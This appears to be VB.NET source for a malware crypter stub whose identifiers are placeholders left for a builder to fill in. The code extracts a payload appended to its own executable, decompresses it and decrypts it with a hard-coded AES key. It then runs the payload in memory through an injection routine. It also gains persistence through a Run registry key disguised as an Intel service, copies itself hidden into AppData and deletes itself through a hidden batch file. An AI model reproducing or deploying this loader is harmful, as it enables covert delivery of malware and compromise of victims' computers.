
Public Class Form1

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        %SHIT0%.%SHIT16%()
        %SHIT0%.%SHIT15%()
        %SHIT0%.%SHIT17%()
    End Sub

End Class


Class %SHIT0%
    Shared Function %SHIT1%(ByVal %SHIT2%() As Byte, %SHIT3% As Integer) As Byte()
        Dim %SHIT4%(0 To (%SHIT2%.Length - %SHIT3%) - 1) As Byte
        Return %SHIT4%
    End Function

    Shared Sub %SHIT5%(ByVal %SHIT6% As String, ByVal %SHIT7% As String)
        Dim %SHIT8% = New anti.IntegrityCheck
        %SHIT8%.AppExePath = %SHIT7%
        %SHIT8%.AppPath = %SHIT6%
        %SHIT8%.RunCheck()
    End Sub

    Shared Sub %SHIT17%()
        Dim %SHIT9% As String = Application.ExecutablePath

        Dim %SHIT2%() As Byte = %SHIT10%(%SHIT9%)
        Dim %SHIT14% As Integer = %SHIT12%(%SHIT2%)
        Dim %SHIT3% As Integer = i
        If %SHIT2%(%SHIT3% - 10) = &H54 Then
            'AZi's
            %SHIT5%(Application.StartupPath, %SHIT9%)
        End If

        If %SHIT2%(%SHIT3% - 14) = &H54 Then
            'copy self
            Dim %SHIT11% As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
            If %SHIT9%.ToLower.Contains(%SHIT11%.ToLower) Then
            Else
                Dim %SHIT13% As String = Strings.Right(%SHIT9%, (%SHIT9%.ToString.Length - %SHIT9%.LastIndexOf("\")))

                'copy our self to temp and re execute
                Try
                    FileIO.FileSystem.WriteAllBytes(%SHIT11% & %SHIT13%, FileIO.FileSystem.ReadAllBytes(%SHIT9%), False)

                Catch ex As Exception
                    Try
                        FileIO.FileSystem.DeleteFile(%SHIT11% & %SHIT13%)
                        FileIO.FileSystem.WriteAllBytes(%SHIT11% & %SHIT13%, FileIO.FileSystem.ReadAllBytes(%SHIT9%), False)

                    Catch exx As Exception
                        End
                    End Try
                End Try


                System.IO.File.SetAttributes(%SHIT11% & %SHIT13%, IO.FileAttributes.Hidden)
                System.IO.File.SetAttributes(%SHIT11% & %SHIT13%, IO.FileAttributes.System)
                Process.Start(%SHIT11% & %SHIT13%)
                'melt
                If %SHIT2%(%SHIT3% - 12) = &H54 Then
                    FileIO.FileSystem.WriteAllText("a.bat", "ping 127.0.0.1 -n 3 > nul" & Environment.NewLine & "del " & """" & Application.ExecutablePath & """" & Environment.NewLine & "del a.bat", False)
                    Dim startInfo As New ProcessStartInfo("a.bat")
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden
                    Process.Start(startInfo)
                    End
                Else
                    End
                End If

            End If
        End If

        'check if auto startup
        If %SHIT2%(%SHIT3% - 8) = &H54 Then
            %SHIT15%()
        End If

        Dim %SHIT4%() As Byte = %SHIT1%(%SHIT2%, %SHIT3%)
        %SHIT4% = Loop1(%SHIT4%, %SHIT2%, %SHIT3%)
        %SHIT4% = Loop2(%SHIT4%)


        Award.Win.Run(%SHIT19%(%SHIT18%(%SHIT4%)), Command, Application.ExecutablePath)

        Process.GetCurrentProcess.Kill()
    End Sub


    Public Shared Function %SHIT18%(bytes As Byte()) As Byte()
        Dim stream = New IO.MemoryStream()
        Dim zipStream = New IO.Compression.DeflateStream(New IO.MemoryStream(bytes), IO.Compression.CompressionMode.Decompress, True)
        Dim buffer = New Byte(4095) {}
        While True
            Dim size = zipStream.Read(buffer, 0, buffer.Length)
            If size > 0 Then
                stream.Write(buffer, 0, size)
            Else
                Exit While
            End If
        End While
        zipStream.Close()
        Return stream.ToArray()
    End Function
    Shared Function Loop2(ByVal %SHIT4%() As Byte) As Byte()
        Dim Tmp() As Byte = %SHIT4%
        Dim %SHIT14% As Integer = %SHIT12%(%SHIT4%) - 7
        ReDim %SHIT4%(0 To I)
        For %SHIT14% = 0 To %SHIT4%.Length - 1
            %SHIT4%(I) = Tmp(I)
        Next
        Return %SHIT4%
    End Function

    Shared Function Loop1(ByVal %SHIT4%() As Byte, ByVal %SHIT2%() As Byte, ByVal %SHIT3% As Integer) As Byte()
        For %SHIT14% As Integer = 0 To %SHIT4%.Length - 1
            %SHIT4%(i) = %SHIT2%(%SHIT3% + i)
        Next
        Return %SHIT4%
    End Function

    Shared Sub %SHIT15%()
        Dim regKey As Microsoft.Win32.RegistryKey
        regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
        regKey.SetValue("Intel(R) Dynamic Platform and Thermal Framework LPM Policy Service Helper", """" & Application.ExecutablePath & """")
        regKey.Close()
    End Sub
    Shared Function %SHIT12%(ByVal %SHIT2%() As Byte) As Integer
        Dim Found1 As Boolean = False
        Dim Found2 As Boolean = False
        Dim Found3 As Boolean = False
        Dim Found4 As Boolean = False
        Dim Found5 As Boolean = False
        Dim %SHIT14% As Integer = 0
        For Each bytez As Byte In %SHIT2%
            If Found5 = True Then Exit For
            If Found1 = False Then
                If bytez = &H21 Then
                    Found1 = True
                End If
            Else
                If Found2 = False Then
                    If bytez = &H0 Then
                        Found2 = True
                    Else
                        Found1 = False
                    End If
                Else
                    If Found3 = False Then
                        If bytez = &H40 Then
                            Found3 = True
                        Else
                            Found1 = False
                            Found2 = False
                        End If
                    Else
                        If Found4 = False Then
                            If bytez = &H0 Then
                                Found4 = True
                            Else
                                Found3 = False
                                Found2 = False
                                Found1 = False
                            End If
                        Else
                            If Found5 = False Then
                                If bytez = &H21 Then
                                    Found5 = True
                                Else
                                    Found4 = False
                                    Found3 = False
                                    Found2 = False
                                    Found1 = False
                                End If
                            End If
                        End If
                    End If
                End If
            End If
            %SHIT14% += 1
        Next
        Return %SHIT14% + 1
    End Function

    Shared Function %SHIT10%(ByVal %SHIT9% As String) As Byte()
        Return FileIO.FileSystem.ReadAllBytes(%SHIT9%)
    End Function
    Public Shared _initialized As Boolean
    Shared Sub %SHIT16%()
        If Not _initialized Then
            AddHandler AppDomain.CurrentDomain.AssemblyResolve, AddressOf RetrieveEmbeddedAssembly
            _initialized = True
        End If
    End Sub
    Private Shared Function %SHIT19%(ByVal input() As Byte) As Byte()
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider

        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes("password"))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim decrypted() As Byte = DESDecrypter.TransformFinalBlock(input, 0, input.Length)
            Return decrypted
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
    Private Shared Function RetrieveEmbeddedAssembly(sender As Object, args As System.ResolveEventArgs) As System.Reflection.Assembly
        'get the root namespace (im tired of manually adding this)
        Dim asm As Reflection.[Assembly] = System.Reflection.Assembly.GetEntryAssembly
        Dim RootNamespace As String = Strings.Left(asm.EntryPoint.DeclaringType.Namespace, asm.EntryPoint.DeclaringType.Namespace.ToString().IndexOf(".") + 1)
        'fuck ya! Im done manually adding that shit!!!
        Dim resourceName As String = RootNamespace + New Reflection.AssemblyName(args.Name).Name + ".dll"
        'resourceName = "dll.dll"
        Using stream = Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(resourceName)

            Dim assemblyData = New Byte(stream.Length - 1) {}
            'decode assembly here

            stream.Read(assemblyData, 0, assemblyData.Length)
            assemblyData = %SHIT19%(%SHIT18%(assemblyData))
            Return Reflection.Assembly.Load(assemblyData)

        End Using ' stream
    End Function

End Class
